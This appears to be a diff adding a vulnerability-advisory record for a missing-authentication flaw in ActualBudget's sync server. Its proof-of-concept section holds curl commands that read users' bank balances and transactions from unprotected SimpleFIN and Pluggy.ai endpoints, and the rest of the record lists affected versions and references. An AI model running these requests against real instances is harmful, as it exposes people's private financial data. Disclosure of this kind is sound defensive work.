@@ -1,0 +1,452 @@
+advisory_id: GHSA-m2cq-xjgm-f668
+datasource_id: github_osv/GHSA-m2cq-xjgm-f668
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-m2cq-xjgm-f668/GHSA-m2cq-xjgm-f668.json
+aliases:
+  - CVE-2026-27584
+summary: |
+  ActualBudget server is Missing Authentication for SimpleFIN and Pluggy AI bank sync endpoints
+  ### Summary
+
+  Missing authentication middleware in the ActualBudget server component allows any unauthenticated user to query the SimpleFIN and Pluggy.ai integration endpoints and read sensitive bank account balance and transaction information.
+
+  ### Impact
+
+  This vulnerability allows an unauthenticated attacker to read the bank account balance and transaction history of ActualBudget users. This vulnerability impacts all ActualBudget Server users with the SimpleFIN or Pluggy.ai integrations configured. The ActualBudget Server instance must be reachable over the network.
+
+  ### Details
+
+  The ActualBudget server component allows for integration with SimpleFIN and Pluggy.ai services. These services read bank account balances and transaction data from users' banks and return the data to ActualBudget. The affected endpoints facilitate this integration and are intended to be used only by logged in users for the purposes of syncing bank transaction data.
+
+  The vulnerable source code is in the following files in the `actualbudget/actual` GitHub repository (https://github.com/actualbudget/actual/):
+  * `/packages/sync-server/src/app-simplefin/app-simplefin.js`
+  * `/packages/sync-server/src/app-pluggyai/app-pluggyai.js`
+
+  The sensitive endpoints missing authentication are:
+  * `POST /simplefin/status`
+  * `POST /simplefin/accounts`
+  * `POST /simplefin/transactions`
+  * `POST /pluggyai/status`
+  * `POST /pluggyai/accounts`
+  * `POST /pluggyai/transactions`
+
+  The following source code is an example of an integration that implements the authentication middleware (`packages/sync-server/src/app-gocardless/app-gocardless.js`):
+  ```js
+  const app = express();
+  app.use(requestLoggerMiddleware);
+  ...
+  app.use(express.json());
+  app.use(validateSessionMiddleware); // <-- Uses authentication
+  ```
+
+
+  ### PoC
+
+  The below commands exploit this vulnerability on both the SimpleFIN and Pluggy.ai endpoints. No authentication is required. Network access is required.
+
+  SimpleFIN:
+  ```bash
+  # Check if SimpleFIN is configured
+  curl -X POST "https://<actualbudgethost>/simplefin/status"
+
+  # List SimpleFIN accounts
+  curl -X POST "https://<actualbudgethost>/simplefin/accounts"
+
+  # List SimpleFIN transactions with an account ID from the previous request
+  curl -X POST "https://<actualbudgethost>/simplefin/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
+  ```
+
+  PluggyAI:
+  ```bash
+  # Check if PluggyAI is configured
+  curl -X POST "https://<actualbudgethost>/pluggyai/status"
+
+  # List Pluggy.ai accounts
+  curl -X POST "https://<actualbudgethost>/pluggyai/accounts"
+
+  # List Pluggy.ai transactions with an account ID from the previous request
+  curl -X POST "https://<actualbudgethost>/pluggyai/transactions" -H "Content-Type: application/json" -d '{"accountId":["ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"],"startDate":["2026-02-01"]}'
+  ```
+
+  Example response from `POST /simplefin/accounts`:
+  ```json
+  {
+      "status": "ok",
+      "data": {
+          "accounts": [
+              {
+                  "id": "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
+                  "name": "CHEQUING ACCOUNT",
+                  "currency": "CAD",
+                  "balance": "1234.56",
+                  "available-balance": "0.00",
+                  "balance-date": 1771531758,
+                  "transactions": [],
+                  "holdings": [],
+                  "org": {
+                      "domain": "www.cibc.com",
+                      "name": "CIBC",
+                      "sfin-url": "https://beta-bridge.simplefin.org/simplefin",
+                      "url": "https://www.cibconline.cibc.com",
+                      "id": "www.cibconline.cibc.com"
+                  }
+              },
+              ...
+          ]
+      }
+  }
+  ```
+
+  Example response from `POST /simplefin/transactions`:
+  ```json
+  {
+      "status": "ok",
+      "data": {
+          "ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX": {
+              "balances": [
+                  {
+                      "balanceAmount": {
+                          "amount": "1234.56",
+                          "currency": "CAD"
+                      },
+                      "balanceType": "expected",
+                      "referenceDate": "2026-02-19"
+                  },
+                  {
+                      "balanceAmount": {
+                          "amount": "1234.56",
+                          "currency": "CAD"
+                      },
+                      "balanceType": "interimAvailable",
+                      "referenceDate": "2026-02-19"
+                  }
+              ],
+              "startingBalance": 123456,
+              "transactions": {
+                  "all": [
+                      {
+                          "booked": true,
+                          "sortOrder": 1771502400,
+                          "date": "2026-02-19",
+                          "payeeName": "E-Transfer",
+                          "notes": "SEND E-TFR ***ABC",
+                          "transactionAmount": {
+                              "amount": "-12.00",
+                              "currency": "USD"
+                          },
+                          "transactionId": "TRN-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX",
+                          "transactedDate": "2026-02-19",
+                          "postedDate": "2026-02-19"
+                      },
+                      ...
+                  ],
+                  "pending": []
+              }
+          }
+      }
+  }
+  ```
+impacted_packages:
+  - purl: pkg:npm/%40actual-app/sync-server
+    affected_versions: vers:npm/<26.2.1
+    fixed_versions: vers:npm/26.2.1
+    affected_packages:
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.0
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.1
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.3
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.4
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.5
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.6
+      - pkg:npm/%40actual-app/sync-server@25.4.0-alpha.7
+      - pkg:npm/%40actual-app/sync-server@25.5.0-alpha.0
+      - pkg:npm/%40actual-app/sync-server@25.5.0-alpha.2
+      - pkg:npm/%40actual-app/sync-server@25.5.0
+      - pkg:npm/%40actual-app/sync-server@25.6.0-nightly.24
+      - pkg:npm/%40actual-app/sync-server@25.6.0
+      - pkg:npm/%40actual-app/sync-server@25.6.1
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250611
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250612
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250613
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250614
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250615
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250616
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250617
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250618
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250619
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250620
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250621
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250622
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250623
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250624
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250625
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250626
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250627
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250628
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250629
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250630
+      - pkg:npm/%40actual-app/sync-server@25.7.0-nightly.20250701
+      - pkg:npm/%40actual-app/sync-server@25.7.0
+      - pkg:npm/%40actual-app/sync-server@25.7.1
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250702
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250703
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250704
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250705
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250706
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250707
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250708
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250709
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250710
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250711
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250712
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250713
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250714
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250715
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250716
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250717
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250718
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250719
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250720
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250721
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250722
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250723
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250724
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250725
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250726
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250727
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250728
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250729
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250730
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250731
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250801
+      - pkg:npm/%40actual-app/sync-server@25.8.0-nightly.20250802
+      - pkg:npm/%40actual-app/sync-server@25.8.0
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250803
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250804
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250805
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250806
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250807
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250808
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250809
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250810
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250811
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250812
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250813
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250814
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250815
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250816
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250817
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250818
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250819
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250820
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250821
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250822
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250823
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250824
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250825
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250826
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250827
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250828
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250829
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250830
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250831
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250901
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250902
+      - pkg:npm/%40actual-app/sync-server@25.9.0-nightly.20250903
+      - pkg:npm/%40actual-app/sync-server@25.9.0
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250904
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250905
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250906
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250907
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250908
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250909
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250910
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250911
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250912
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250913
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250914
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250915
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250916
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250917
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250918
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250919
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250920
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250921
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250922
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250923
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250924
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250925
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250926
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250927
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250928
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250929
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20250930
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20251001
+      - pkg:npm/%40actual-app/sync-server@25.10.0-nightly.20251002
+      - pkg:npm/%40actual-app/sync-server@25.10.0
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251003
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251004
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251005
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251006
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251007
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251008
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251009
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251010
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251011
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251012
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251013
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251014
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251015
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251016
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251017
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251018
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251019
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251020
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251021
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251022
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251023
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251024
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251025
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251026
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251027
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251028
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251029
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251030
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251031
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251101
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251102
+      - pkg:npm/%40actual-app/sync-server@25.11.0-nightly.20251103
+      - pkg:npm/%40actual-app/sync-server@25.11.0
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251104
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251105
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251106
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251107
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251108
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251109
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251110
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251111
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251112
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251113
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251114
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251115
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251116
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251117
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251118
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251119
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251120
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251121
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251122
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251123
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251124
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251125
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251126
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251127
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251128
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251129
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251130
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251201
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251202
+      - pkg:npm/%40actual-app/sync-server@25.12.0-nightly.20251203
+      - pkg:npm/%40actual-app/sync-server@25.12.0
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251204
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251205
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251206
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251207
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251208
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251209
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251210
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251211
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251212
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251213
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251214
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251215
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251216
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251217
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251218
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251219
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251220
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251221
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251222
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251223
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251224
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251225
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251226
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251227
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251228
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251229
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251230
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20251231
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20260101
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20260102
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20260103
+      - pkg:npm/%40actual-app/sync-server@26.1.0-nightly.20260104
+      - pkg:npm/%40actual-app/sync-server@26.1.0
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260105
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260106
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260107
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260108
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260109
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260110
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260111
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260112
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260113
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260114
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260115
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260116
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260117
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260118
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260119
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260120
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260121
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260122
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260123
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260124
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260125
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260126
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260127
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260128
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260129
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260130
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260131
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260201
+      - pkg:npm/%40actual-app/sync-server@26.2.0-nightly.20260202
+      - pkg:npm/%40actual-app/sync-server@26.2.0
+    fixed_packages:
+      - pkg:npm/%40actual-app/sync-server@26.2.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/actualbudget/actual
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/actualbudget/actual
+        commit: ea937d100956ca56689ff852d99c28589e2a7d88
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.2'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-m2cq-xjgm-f668/GHSA-m2cq-xjgm-f668.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-306
+references:
+  - url: https://github.com/actualbudget/actual
+    reference_type:
+    reference_id:
+  - url: https://github.com/actualbudget/actual/commit/ea937d100956ca56689ff852d99c28589e2a7d88
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27584
+    reference_type:
+    reference_id: CVE-2026-27584
+  - url: https://github.com/actualbudget/actual/security/advisories/GHSA-m2cq-xjgm-f668
+    reference_type:
+    reference_id: GHSA-m2cq-xjgm-f668
+exploits: []
